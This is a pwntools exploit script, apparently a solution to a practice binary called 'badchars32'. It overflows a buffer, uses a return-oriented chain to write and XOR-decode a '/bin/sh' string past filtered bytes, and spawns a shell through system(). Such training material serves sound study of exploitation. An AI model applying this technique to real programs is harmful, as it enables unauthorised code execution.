from pwn import *

badchars = 'bic/ fns'

xor = 0x8048890
mov = 0x8048893
popxor = 0x8048896
popmov = 0x8048899
bin_sh_xor = '\x05HCD\x05YB*'
bin_sh_addr = 0x0804a038
system_call = 0x80484e0

p = process('./badchars32')
exploit = ''
exploit += 'A'*44
exploit += p32(popmov)
exploit += bin_sh_xor[0:4]
exploit += p32(bin_sh_addr)
exploit += p32(mov)

exploit += p32(popmov)
exploit += bin_sh_xor[4:8]
exploit += p32(bin_sh_addr+4)
exploit += p32(mov)

for i in range(8):
	exploit += p32(popxor)
	exploit += p32(bin_sh_addr+i)
	exploit += p32(42)
	exploit += p32(xor)

exploit += p32(system_call)
exploit += 'aaaa'
exploit += p32(bin_sh_addr)

p.recvuntil('>')
p.sendline(exploit)
p.interactive()
